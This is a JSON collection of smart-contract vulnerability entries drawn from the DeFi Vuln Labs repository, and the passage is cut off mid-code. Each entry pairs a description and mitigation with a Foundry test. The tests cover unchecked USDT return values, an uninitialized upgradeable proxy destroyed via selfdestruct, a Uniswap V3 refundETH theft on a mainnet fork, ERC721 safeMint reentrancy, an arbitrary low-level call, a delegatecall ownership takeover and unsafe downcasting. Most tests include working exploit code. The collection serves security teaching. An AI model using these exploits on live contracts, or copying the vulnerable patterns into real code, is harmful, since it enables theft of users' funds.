    "description": "EIP20 standard:\nReturns a boolean value indicating whether the operation succeeded.\nfunction transfer(address to, uint256 amount) external returns (bool);\n\nUSDT doesn't correctly implement the EIP20 standard,\nso calling these functions with the correct EIP20 function signatures will always revert.\nfunction transfer(address to, uint256 value) external;\n\nERC20 transfer:\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\nUSDT transfer without a return value:\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 32) {\n        ...\n        }\n        Transfer(msg.sender, _to, sendAmount);\n    }",
    "mitigation": "Use OpenZeppelin’s SafeERC20 library and change transfer to safeTransfer.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1600868995007410176",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Unchecked return value\n\nDescription:\nEIP20 standard:\nReturns a boolean value indicating whether the operation succeeded.\nfunction transfer(address to, uint256 amount) external returns (bool);\n\nUSDT doesn't correctly implement the EIP20 standard,\nso calling these functions with the correct EIP20 function signatures will always revert.\nfunction transfer(address to, uint256 value) external;\n\nERC20 transfer:\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\nUSDT transfer without a return value:\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\n        ...\n        }\n        Transfer(msg.sender, _to, sendAmount);\n    }\n\nMitigation:\nUse OpenZeppelin’s SafeERC20 library and change transfer to safeTransfer.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1600868995007410176\n\n*/\ninterface USDT {\n    function transfer(address to, uint256 value) external;\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external;\n}\n\ncontract ContractTest is Test {\n    using SafeERC20 for IERC20;\n    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 16138254);\n    }\n\n    function testTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        usdt.transfer(address(this), 123); //revert\n        vm.stopPrank();\n    }\n\n    function testSafeTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        usdt.safeTransfer(address(this), 123);\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Returnvalue.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "uninitialized-variables",
    "slug": "uninitialized-variables",
    "title": "Uninitialized variable Vulnerability",
    "description": "Uninitialized local storage variables may contain the value of other storage variables in the contract; \nthis fact can cause unintentional vulnerabilities, or be exploited deliberately.\n\nREF:\nhttps://blog.dixitaditya.com/ethernaut-level-25-motorbike",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\n/*\nName: Uninitialized variable Vulnerability\n\nDescription:\nUninitialized local storage variables may contain the value of other storage variables in the contract; \nthis fact can cause unintentional vulnerabilities, or be exploited deliberately.\n\nREF:\nhttps://blog.dixitaditya.com/ethernaut-level-25-motorbike\n*/\n\ncontract ContractTest is Test {\n    Engine EngineContract;\n    Motorbike MotorbikeContract;\n    Attack AttackContract;\n\n    function testUninitialized() public {\n        EngineContract = new Engine();\n        MotorbikeContract = new Motorbike(address(EngineContract));\n        AttackContract = new Attack();\n\n        // Engine contract is not initialized\n        console.log(\"Unintialized Upgrader:\", EngineContract.upgrader());\n        // Malicious user calls initialize() on Engine contract to become upgrader.\n        address(EngineContract).call(abi.encodeWithSignature(\"initialize()\"));\n        // Malicious user becomes the upgrader\n        console.log(\"Initialized Upgrader:\", EngineContract.upgrader());\n\n        // Upgrade the implementation of the proxy to a malicious contract and call `attack()`\n        bytes memory initEncoded = abi.encodeWithSignature(\"attack()\");\n        address(EngineContract).call(\n            abi.encodeWithSignature(\n                \"upgradeToAndCall(address,bytes)\",\n                address(AttackContract),\n                initEncoded\n            )\n        );\n\n        console.log(\"Exploit completed\");\n        console.log(\"Since EngineContract destroyed, next call will fail.\");\n        address(EngineContract).call(\n            abi.encodeWithSignature(\n                \"upgradeToAndCall(address,bytes)\",\n                address(AttackContract),\n                initEncoded\n            )\n        );\n    }\n}\n\ncontract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) {\n        require(\n            Address.isContract(_logic),\n            \"ERC1967: new implementation is not a contract\"\n        );\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success, ) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(\n                gas(),\n                implementation,\n                0,\n                calldatasize(),\n                0,\n                0\n            )\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 {\n                revert(0, returndatasize())\n            }\n            default {\n                return(0, returndatasize())\n            }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`.\n    // Will run if no other function in the contract matches the call data\n    fallback() external payable virtual {\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    }\n\n    // Returns an `AddressSlot` with member `value` located at `slot`.\n    function _getAddressSlot(\n        bytes32 slot\n    ) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n}\n\ncontract Engine is Initializable {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    function initialize() external initializer {\n        horsePower = 1000;\n        upgrader = msg.sender;\n    }\n\n    // Upgrade the implementation of the proxy to `newImplementation`\n    // subsequently execute the function call\n    function upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) external payable {\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    }\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view {\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    }\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal {\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length > 0) {\n            (bool success, ) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        }\n    }\n\n    event Returny(uint256);\n\n    function greetMe() public {\n        emit Returny(0x42);\n    }\n\n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private {\n        require(\n            Address.isContract(newImplementation),\n            \"ERC1967: new implementation is not a contract\"\n        );\n\n        AddressSlot storage r;\n        assembly {\n            r.slot := _IMPLEMENTATION_SLOT\n        }\n        r.value = newImplementation;\n    }\n}\n\ncontract Attack {\n    function attack() external {\n        selfdestruct(payable(msg.sender));\n    }\n}\n",
    "severity": "Medium",
    "category": "Logic Error",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Uninitialized_variables.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "uniswap-v3eth-refund-exploit",
    "slug": "uniswap-v3eth-refund-exploit",
    "title": "UniswapV3ETHRefundExploit",
    "description": "No description provided.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n// this excersise is specific UniSwapV3 ETH refund issue\n// https://github.com/Jeiwan/uniswapv3-unrefunded-eth-poc\n// @article:\n// https://jeiwan.net/posts/public-bug-report-uniswap-swaprouter/\n\nstruct ExactInputSingleParams {\n    address tokenIn;\n    address tokenOut;\n    uint24 fee;\n    address recipient;\n    uint256 deadline;\n    uint256 amountIn;\n    uint256 amountOutMinimum;\n    uint160 sqrtPriceLimitX96;\n}\n\ninterface ISwapRouter {\n    function exactInputSingle(\n        ExactInputSingleParams calldata params\n    ) external payable returns (uint256 amountOut);\n\n    function refundETH() external payable;\n}\n\ninterface IPool {\n    function slot0()\n        external\n        view\n        returns (\n            uint160 sqrtPriceX96,\n            int24 tick,\n            uint16 observationIndex,\n            uint16 observationCardinality,\n            uint16 observationCardinalityNext,\n            uint8 feeProtocol,\n            bool unlocked\n        );\n}\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n}\n\ninterface IWETH9 {\n    function approve(address guy, uint256 wad) external returns (bool);\n}\n\ncontract UniswapV3ETHRefundExploitTest is Test {\n    ISwapRouter router =\n        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n    IPool pool = IPool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);\n\n    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    function testExploit() public {\n        vm.createSelectFork(\"mainnet\", 16454867);\n\n        uint256 amountIn = 100 ether;\n\n        vm.label(address(this), \"user\");\n        vm.deal(address(this), amountIn);\n\n        // Users sells 100 ETH to buy USDC. They have a limit price set.\n        ExactInputSingleParams memory params = ExactInputSingleParams({\n            tokenIn: weth,\n            tokenOut: usdc,\n            fee: 500,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: amountIn,\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 1956260967287247098961477920037032 // (sqrtPrice before + sqrtPrice after) / 2\n        });\n\n        // Full input amount is sent along the call.\n        router.exactInputSingle{value: amountIn}(params);\n\n        // User has bought some USDC. However, the full input ETH amount wasn't used...\n        assertEq(IERC20(usdc).balanceOf(address(this)), 81979.308775e6);\n\n        // ... the remaining ETH is still in the Router contract.\n        uint256 routerBeforeBalance = address(router).balance;\n        assertEq(routerBeforeBalance, 50 ether);\n\n        // A MEV bot steals the remaining ETH by calling the public refundETH function.\n        address mev = address(0x31337);\n        vm.label(mev, \"mev\");\n\n        vm.prank(mev);\n        router.refundETH();\n        assertEq(address(mev).balance, 50 ether);\n        uint256 routerAfterBalance = address(router).balance;\n        assertEq(routerAfterBalance, 0 ether);\n        console.log(\n            \"router loss ether amount:\",\n            routerBeforeBalance - routerAfterBalance\n        );\n    }\n}\n",
    "severity": "Medium",
    "category": "Oracle",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/UniswapV3ETHRefundExploit.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "unprotected-callback",
    "slug": "unprotected-callback",
    "title": "Unprotected callback - ERC721 SafeMint reentrancy",
    "description": "The contract ContractTest is exploiting a callback feature to bypass the maximum mint limit \nset by the MaxMint721 contract. This is achieved by triggering the onERC721Received function,\nwhich internally calls the mint function again. Therefore, although MaxMint721 attempts \nto limit the number of tokens that a user can mint to MAX_PER_USER, the ContractTest contract \nsuccessfully mints more tokens than this limit.",
    "mitigation": "Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a\nhttps://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\n\n/*\nName: Unprotected callback - ERC721 SafeMint reentrancy\n\nDescription:\nThe contract ContractTest is exploiting a callback feature to bypass the maximum mint limit \nset by the MaxMint721 contract. This is achieved by triggering the onERC721Received function,\nwhich internally calls the mint function again. Therefore, although MaxMint721 attempts \nto limit the number of tokens that a user can mint to MAX_PER_USER, the ContractTest contract \nsuccessfully mints more tokens than this limit. \n\nScenario:\nThis excersise is about a contract that via callback function to mint more NFTs\n\nMitigation:\nFollow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a\nhttps://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code\n\n*/\n\ncontract ContractTest is Test {\n    MaxMint721 MaxMint721Contract;\n    bool complete;\n    uint256 maxMints = 10;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n\n    function testSafeMint() public {\n        MaxMint721Contract = new MaxMint721();\n        MaxMint721Contract.mint(maxMints);\n        console.log(\"Bypassed maxMints, we got 19 NFTs\");\n        assertEq(MaxMint721Contract.balanceOf(address(this)), 19);\n        console.log(\"NFT minted:\", MaxMint721Contract.balanceOf(address(this)));\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public returns (bytes4) {\n        if (!complete) {\n            complete = true;\n            MaxMint721Contract.mint(maxMints - 1);\n            console.log(\"Called with :\", maxMints - 1);\n        }\n        return this.onERC721Received.selector;\n    }\n\n    receive() external payable {}\n}\n\ncontract MaxMint721 is ERC721Enumerable {\n    uint256 public MAX_PER_USER = 10;\n\n    constructor() ERC721(\"ERC721\", \"ERC721\") {}\n\n    function mint(uint256 amount) external {\n        require(\n            balanceOf(msg.sender) + amount <= MAX_PER_USER,\n            \"exceed max per user\"\n        );\n        for (uint256 i = 0; i < amount; i++) {\n            uint256 mintIndex = totalSupply();\n            _safeMint(msg.sender, mintIndex);\n        }\n    }\n}\n",
    "severity": "Medium",
    "category": "Reentrancy",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Unprotected-callback.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "unsafe-call",
    "slug": "unsafe-call",
    "title": "Unsafe Call Vulnerability",
    "description": "In TokenWhale contract's approveAndCallcode function. The vulnerability allows an \narbitrary call to be executed with arbitrary data, leading to potential security risks\nand unintended consequences. The function uses a low-level call (_spender.call(_extraData))\nto execute code from the _spender address without any validation or checks on the provided _extraData.\nThis can lead to unexpected behavior, reentrancy attacks, or unauthorized operations.\n\nThis excersise is about  a low level call to a contract where input and return values are not checked\nIf the call data is controllable, it is easy to cause arbitrary function execution.",
    "mitigation": "Use of low level \"call\" should be avoided whenever possible.  \n\nREF\nhttps://blog.li.fi/20th-march-the-exploit-e9e1c5c03eb9",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\n/*\nName: Unsafe Call Vulnerability\n\nDescription:\nIn TokenWhale contract's approveAndCallcode function. The vulnerability allows an \narbitrary call to be executed with arbitrary data, leading to potential security risks\nand unintended consequences. The function uses a low-level call (_spender.call(_extraData))\nto execute code from the _spender address without any validation or checks on the provided _extraData.\nThis can lead to unexpected behavior, reentrancy attacks, or unauthorized operations.\n\nThis excersise is about  a low level call to a contract where input and return values are not checked\nIf the call data is controllable, it is easy to cause arbitrary function execution.\n\nMitigation:\nUse of low level \"call\" should be avoided whenever possible.  \n\nREF\nhttps://blog.li.fi/20th-march-the-exploit-e9e1c5c03eb9\n*/\n\nimport \"forge-std/Test.sol\";\n\ncontract ContractTest is Test {\n    TokenWhale TokenWhaleContract;\n\n    function testUnsafeCall() public {\n        address alice = vm.addr(1);\n        TokenWhaleContract = new TokenWhale();\n        TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));\n        console.log(\n            \"TokenWhale balance:\",\n            TokenWhaleContract.balanceOf(address(TokenWhaleContract))\n        );\n\n        // bytes memory payload = abi.encodeWithSignature(\"transfer(address,uint256)\",address(alice),1000);\n\n        console.log(\n            \"Alice tries to perform unsafe call to transfer asset from TokenWhaleContract\"\n        );\n        vm.prank(alice);\n        TokenWhaleContract.approveAndCallcode(\n            address(TokenWhaleContract),\n            0x1337, // doesn't affect the exploit\n            abi.encodeWithSignature(\n                \"transfer(address,uint256)\",\n                address(alice),\n                1000\n            )\n        );\n\n        // check if the exploit is successful\n        assertEq(TokenWhaleContract.balanceOf(address(alice)), 1000);\n        console.log(\"Exploit completed\");\n        console.log(\n            \"TokenWhale balance:\",\n            TokenWhaleContract.balanceOf(address(TokenWhaleContract))\n        );\n        console.log(\n            \"Alice balance:\",\n            TokenWhaleContract.balanceOf(address(alice))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract TokenWhale {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000; // 1 mil\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n\n    /* Approves and then calls the contract code*/\n\n    function approveAndCallcode(\n        address _spender,\n        uint256 _value,\n        bytes memory _extraData\n    ) public {\n        allowance[msg.sender][_spender] = _value;\n\n        bool success;\n        // vulnerable call execute unsafe user code\n        (success, ) = _spender.call(_extraData);\n        console.log(\"success:\", success);\n    }\n}\n",
    "severity": "Medium",
    "category": "Reentrancy",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/UnsafeCall.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "delegatecall",
    "slug": "delegatecall",
    "title": "Unsafe Delegatecall Vulnerability",
    "description": "The Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that\nallows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.\nThe vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. \ndelegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context \nof the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.\nThis allows a smart contract to dynamically load code from a different address at runtime.",
    "mitigation": "To mitigate the Proxy Contract Owner Manipulation Vulnerability, \navoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. \nIf the delegatecall is necessary for the contract's functionality, make sure to validate and \nsanitize inputs to avoid unexpected behaviors.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Unsafe Delegatecall Vulnerability\n\nDescription:\nThe Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that\nallows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.\nThe vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. \ndelegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context \nof the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.\nThis allows a smart contract to dynamically load code from a different address at runtime.\n\nScenario:\nProxy Contract is designed for helping users call logic contract\nProxy Contract's owner is hardcoded as 0xdeadbeef\nCan you manipulate Proxy Contract's owner ?\n\nMitigation:\nTo mitigate the Proxy Contract Owner Manipulation Vulnerability, \navoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. \nIf the delegatecall is necessary for the contract's functionality, make sure to validate and \nsanitize inputs to avoid unexpected behaviors.\n*/\n \ncontract Proxy {\n    address public owner = address(0xdeadbeef); // slot0\n    Delegate delegate;\n\n    constructor(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n    }\n\n    fallback() external {\n        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable\n        require(suc, \"Delegatecall failed\");\n    }\n}\n\ncontract ContractTest is Test {\n    Proxy proxy;\n    Delegate DelegateContract;\n    address alice;\n\n    function setUp() public {\n        alice = vm.addr(1);\n    }\n\n    function testDelegatecall() public {\n        DelegateContract = new Delegate(); // logic contract\n        proxy = new Proxy(address(DelegateContract)); // proxy contract\n\n        console.log(\"Alice address\", alice);\n        console.log(\"DelegationContract owner\", proxy.owner());\n\n        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.\n        console.log(\"Change DelegationContract owner to Alice...\");\n        vm.prank(alice);\n        address(proxy).call(abi.encodeWithSignature(\"pwn()\")); // exploit here\n        // Proxy.fallback() will delegatecall Delegate.pwn()\n\n        console.log(\"DelegationContract owner\", proxy.owner());\n        console.log(\n            \"Exploit completed, proxy contract storage has been manipulated\"\n        );\n    }\n}\n\ncontract Delegate {\n    address public owner; // slot0\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n",
    "severity": "Medium",
    "category": "Logic Error",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Delegatecall.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "unsafe-downcast",
    "slug": "unsafe-downcast",
    "title": "Unsafe downcasting",
    "description": "Downcasting from a larger integer type to a smaller one without checks can lead to unexpected behavior \nif the value of the larger integer is outside the range of the smaller one.",
    "mitigation": "Make sure consistent uint256, or use openzepplin safeCasting.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673511868839886849\nhttps://github.com/code-423n4/2022-12-escher-findings/issues/369\nhttps://github.com/sherlock-audit/2022-10-union-finance-judging/issues/96",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n// Import the SafeCast library\nimport \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n/*\nName: Unsafe downcasting\n\nDescription:\nDowncasting from a larger integer type to a smaller one without checks can lead to unexpected behavior \nif the value of the larger integer is outside the range of the smaller one.\n\nMitigation:  \nMake sure consistent uint256, or use openzepplin safeCasting.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673511868839886849\nhttps://github.com/code-423n4/2022-12-escher-findings/issues/369\nhttps://github.com/sherlock-audit/2022-10-union-finance-judging/issues/96\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testUnsafeDowncast() public {\n        SimpleBankContract.deposit(257); //overflowed\n\n        console.log(\n            \"balance of SimpleBankContract:\",\n            SimpleBankContract.getBalance()\n        );\n\n        // balance is 1, because of overflowed\n        assertEq(SimpleBankContract.getBalance(), 1);\n    }\n\n    function testsafeDowncast() public {\n        vm.expectRevert(\"SafeCast: value doesn't fit in 8 bits\");\n        FixedSimpleBankContract.deposit(257); //revert\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit(uint256 amount) public {\n        // Here's the unsafe downcast. If the `amount` is greater than type(uint8).max\n        // (which is 255), then only the least significant 8 bits are stored in balance.\n        // This could lead to unexpected results due to overflow.\n        uint8 balance = uint8(amount);\n\n        // store the balance\n        balances[msg.sender] = balance;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n}\n\ncontract FixedSimpleBank {\n    using SafeCast for uint256; // Use SafeCast for uint256\n\n    mapping(address => uint) private balances;\n\n    function deposit(uint256 _amount) public {\n        // Use the `toUint8()` function from `SafeCast` to safely downcast `amount`.\n        // If `amount` is greater than `type(uint8).max`, it will revert.\n        // or keep the same uint256 with amount.\n        uint8 amount = _amount.toUint8(); // or keep uint256\n\n        // Store the balance\n        balances[msg.sender] = amount;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n}\n",
    "severity": "Medium",
    "category": "Arithmetic",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/unsafe-downcast.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "return-break",
    "slug": "return-break",
    "title": "Use of return in inner loop iteration leads to unintended termination.",
    "description": "This demonstrates the difference between using 'return' and 'break' in nested loop iterations.\nWhen removing multiple banks from a list, using 'return' in the BuggyBankManager will prematurely exit the function\nafter removing only the first bank, leaving other banks untouched.\nIn contrast, the FixedBankManager uses 'break' correctly to only exit the current inner loop iteration,\nallowing the outer loop to continue processing other banks.\n\nThis is similar to a real bug where a function intended to allow the removal of multiple DEXes approved for swaps,\nbut would only remove the first DEX because 'return' was used instead of 'break' in the inner for loop.",
    "mitigation": "Use break instead of return when you only want to exit the current loop, not the entire function.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678596730865221632\nhttps://github.com/code-423n4/2022-03-lifinance-findings/issues/34\nhttps://solidity-by-example.org/loop/",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Use of return in inner loop iteration leads to unintended termination. \n\nDescription:\nThis demonstrates the difference between using 'return' and 'break' in nested loop iterations.\nWhen removing multiple banks from a list, using 'return' in the BuggyBankManager will prematurely exit the function\nafter removing only the first bank, leaving other banks untouched.\nIn contrast, the FixedBankManager uses 'break' correctly to only exit the current inner loop iteration,\nallowing the outer loop to continue processing other banks.\n\nThis is similar to a real bug where a function intended to allow the removal of multiple DEXes approved for swaps,\nbut would only remove the first DEX because 'return' was used instead of 'break' in the inner for loop.\n\nMitigation:  \nUse break instead of return when you only want to exit the current loop, not the entire function.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678596730865221632\nhttps://github.com/code-423n4/2022-03-lifinance-findings/issues/34\nhttps://solidity-by-example.org/loop/\n*/\n\ncontract ContractTest is Test {\n    BuggyBankManager buggyManager;\n    FixedBankManager fixedManager;\n\n    function setUp() public {\n        buggyManager = new BuggyBankManager();\n        fixedManager = new FixedBankManager();\n        \n        // Initialize both managers with the same 3 banks\n        address[] memory initialBanks = new address[](3);\n        string[] memory initialNames = new string[](3);\n        \n        initialBanks[0] = address(0x1);\n        initialNames[0] = \"ABC Bank\";\n        \n        initialBanks[1] = address(0x2);\n        initialNames[1] = \"XYZ Bank\";\n        \n        initialBanks[2] = address(0x3);\n        initialNames[2] = \"Global Bank\";\n        \n        buggyManager.addBanks(initialBanks, initialNames);\n        fixedManager.addBanks(initialBanks, initialNames);\n        \n        // Verify initial state\n        emit log_string(\"Initial state of both bank managers:\");\n        emit log_named_uint(\"Buggy manager bank count\", buggyManager.getBankCount());\n        emit log_named_uint(\"Fixed manager bank count\", fixedManager.getBankCount());\n    }\n\n    function testReturnVsBreak() public {\n        // Try to remove all banks marked for removal\n        emit log_string(\"\\nRemoving banks marked for removal\");\n        \n        // Mark all banks for removal\n        address[] memory banksToRemove = new address[](3);\n        banksToRemove[0] = address(0x1); // ABC Bank\n        banksToRemove[1] = address(0x2); // XYZ Bank\n        banksToRemove[2] = address(0x3); // Global Bank\n        console.log(\"------------Testing buggyManager---------------\");\n        // With buggy implementation (using return)\n        buggyManager.removeBanksWithReturn(banksToRemove);\n        emit log_named_uint(\"Buggy manager (with return) bank count after removal\", buggyManager.getBankCount());\n        buggyManager.listBanks();\n\n        console.log(\"------------Testing FixedBankManager---------------\");\n        // With fixed implementation (using break)\n        fixedManager.removeBanksWithBreak(banksToRemove);\n        emit log_named_uint(\"Fixed manager (with break) bank count after removal\", fixedManager.getBankCount());\n        fixedManager.listBanks();\n    }\n}\n\n// Base contract with common functionality\ncontract BankManager {\n    struct Bank {\n        address bankAddress;\n        string bankName;\n    }\n\n    Bank[] public banks;\n    \n    // Add multiple banks\n    function addBanks(address[] memory addresses, string[] memory names) public {\n        require(addresses.length == names.length, \"Arrays must have the same length\");\n        \n        for (uint i = 0; i < 